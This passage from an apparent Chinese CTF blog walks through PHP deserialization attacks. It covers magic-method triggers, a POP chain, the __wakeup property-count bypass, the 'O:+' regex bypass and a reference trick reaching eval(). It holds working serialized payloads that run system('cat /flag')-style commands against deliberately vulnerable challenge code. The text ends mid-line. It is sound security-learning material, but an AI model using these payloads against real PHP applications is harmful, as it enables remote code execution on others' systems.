class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>();<br><span class="hljs-variable">$a</span>-&gt;sea=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shark</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal-&gt;<span class="hljs-title function_ invoke__">setWord</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>());<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731735946559-10aeb512-e31b-47fc-8158-4690cadd3357.png"></p><p>发送请求包得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731735975531-2971e965-067d-4e8f-858c-fe902f498a73.png"></p><h3 id="关于POP链的构造"><a href="#关于POP链的构造" class="headerlink" title="关于POP链的构造"></a>关于POP链的构造</h3><p>参考文章<a href="https://blog.csdn.net/m0_73185293/article/details/131353031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522B7E564A8-AB7D-4480-9B2C-91AE97CD4A96%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=B7E564A8-AB7D-4480-9B2C-91AE97CD4A96&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131353031-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">链接</a></p><h4 id="常见魔术方法的触发"><a href="#常见魔术方法的触发" class="headerlink" title="常见魔术方法的触发"></a><font style="color:rgb(77, 77, 77);">常见魔术方法的触发</font></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//魔术方法</span><br> <br><span class="hljs-title function_ invoke__">__construct</span>()       <span class="hljs-comment">//类的构造函数，创建对象时触发</span><br> <br><span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">//类的析构函数，对象被销毁时触发</span><br> <br><span class="hljs-title function_ invoke__">__call</span>()            <span class="hljs-comment">//调用对象不可访问、不存在的方法时触发</span><br> <br><span class="hljs-title function_ invoke__">__callStatic</span>()     <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br> <br><span class="hljs-title function_ invoke__">__get</span>()            <span class="hljs-comment">//调用不可访问、不存在的对象成员属性时触发</span><br> <br><span class="hljs-title function_ invoke__">__set</span>()           <span class="hljs-comment">//在给不可访问、不存在的对象成员属性赋值时触发</span><br> <br><span class="hljs-title function_ invoke__">__isset</span>()         <span class="hljs-comment">//当对不可访问属性调用isset()或empty()时触发</span><br> <br><span class="hljs-title function_ invoke__">__unset</span>()         <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br> <br><span class="hljs-title function_ invoke__">__invoke</span>()        <span class="hljs-comment">//把对象当初函数调用时触发</span><br> <br><span class="hljs-title function_ invoke__">__sleep</span>()        <span class="hljs-comment">//执行serialize()时，先会调用这个方法</span><br> <br><span class="hljs-title function_ invoke__">__wakeup</span>()       <span class="hljs-comment">//执行unserialize()时，先会调用这个方法</span><br> <br><span class="hljs-title function_ invoke__">__toString</span>()     <span class="hljs-comment">//把对象当成字符串调用时触发</span><br> <br><span class="hljs-title function_ invoke__">__clone</span>()        <span class="hljs-comment">//使用clone关键字拷贝完一个对象后触发</span><br></code></pre></td></tr></table></figure><h5 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct()和__destruct()"></a>__construct()和__destruct()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__construct()和__destruct()</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;已创建--&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;已销毁&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br>已创建--已销毁<br> <br><span class="hljs-comment">//对象被创建时触发__construct()方法，对象使用完被销毁时触发__destruct()方法</span><br></code></pre></td></tr></table></figure><h5 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__sleep()和__wakeup()</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;使用了serialize()--&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;使用了unserialzie()&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br>使用了<span class="hljs-title function_ invoke__">serialize</span>()--使用了<span class="hljs-title function_ invoke__">unserialzie</span>()<br> <br><span class="hljs-comment">//对象被序列化时触发了__sleep(),字符串被反序列化时触发了__wakeup()</span><br></code></pre></td></tr></table></figure><h5 id="toString-和-invoke"><a href="#toString-和-invoke" class="headerlink" title="__toString()和__invoke()"></a>__toString()和__invoke()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__toString()和__invoke()</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;被当成字符串了--&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;被当成函数了&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>();<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br>被当成字符串了--ss被当成函数了<br> <br><span class="hljs-comment">//ehco $a 把对象当成字符串输出触发了__toString(),$a() 把对象当成</span><br><span class="hljs-comment">//函数执行触发了__invoke()</span><br></code></pre></td></tr></table></figure><h5 id="call（）和其他魔术方法"><a href="#call（）和其他魔术方法" class="headerlink" title="__call（）和其他魔术方法"></a>__call（）和其他魔术方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__call（）和其他魔术方法</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$h</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你调用了不存在的方法&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">h</span>();<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br>你调用了不存在的方法<br> <br><span class="hljs-comment">//$a-&gt;h()调用了不存在的方法触发了__call()方法，其他魔术方法类似不再演示</span><br></code></pre></td></tr></table></figure><h4 id="一些简单的php反序列化绕过方法"><a href="#一些简单的php反序列化绕过方法" class="headerlink" title="一些简单的php反序列化绕过方法"></a>一些简单的php反序列化绕过方法</h4><h5 id="wakeup-方法漏洞"><a href="#wakeup-方法漏洞" class="headerlink" title="__wakeup()方法漏洞"></a><font style="color:rgb(79, 79, 79);">__wakeup()方法漏洞</font></h5><p>存在此漏洞的php版本：php5-php5.6.25、php7-php7.0.10；</p><p>调用unserialize()方法时会先调用__wakeup()方法，但是当序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量是时，__wakeup()方法不会被触发，以下的简单例题是__wakeup()方法漏洞的利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__wakeup()方法绕过例题</span><br> <br> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br> <br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br> <br><span class="hljs-meta">?&gt;</span> NSSCTF&#123;f7b177f4-<span class="hljs-number">8e9</span>c-<span class="hljs-number">4154</span>-<span class="hljs-number">9134</span>-db0011b3b97a&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><pre><code class="hljs">    只要满足__destruct()方法中的if条件就可以获得flag，构造payload时给对于属性赋值即可；    然而，在反序列化调用unserialize()方法时会触发__wakeup方法，进而改变我们给$passwd属性的赋值，最终导致不满足if条件；    因此需要避免__wakeup方法的触发，这就需要可以利用__wakeup()方法的漏洞，使序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量，如下payload的构造：</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>=<span class="hljs-string">&quot;wllm&quot;</span>;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();<br> <br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?p=&quot;</span>.<span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br>?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br> <br><span class="hljs-comment">//将成员属性数量2改为3，大于实际值2即可，payload如下：</span><br>?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h5 id="O-6绕过正则"><a href="#O-6绕过正则" class="headerlink" title="O:+6绕过正则"></a><font style="color:rgb(79, 79, 79);">O:+6绕过正则</font></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//简单案例</span><br> <br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br></code></pre></td></tr></table></figure><p><font style="color:rgb(254, 44, 36);">分析</font></p><p><font style="color:rgb(77, 77, 77);">如上正则匹配检查时，匹配到O:4会终止程序，可以替换为O:+4绕过正则匹配；</font></p><p><font style="color:rgb(77, 77, 77);">或者将对象放入数组再序列化 serialize(array($a))；</font></p><p><font style="color:rgb(77, 77, 77);">前者有的php版本不适应，后者通用；</font></p><h5 id="引用"><a href="#引用" class="headerlink" title="引用"></a><font style="color:rgb(79, 79, 79);">引用</font></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//简单例题</span><br> <br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-comment">###very___so___easy!!!!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>NSSCTF&#123;This_iS_SO_SO_SO_EASY&#125; <br></code></pre></td></tr></table></figure><p>分析</p><pre><code class="hljs">    魔术方法___wakeup()会使变量a为空，且由于正则限制无法通过改变成员数量绕过__wakeup()，这时可以使用引用的方法，使变量a与变量b永远相等，魔术方法__destruct()把变量c值赋给变量b时，相当于给变量a赋值，这就可以完成命令执行，payload如下：</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;system(&quot;cat /fffffffffflagafag&quot;);&#x27;</span>;<br> <br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$h</span>-&gt;b = &amp;<span class="hljs-variable">$h</span>-&gt;a;   <span class="hljs-comment">//注意：取会改变的属性的地址，如取a的地址赋值给b，当给a赋值时a会等于b的值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;?a=&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span 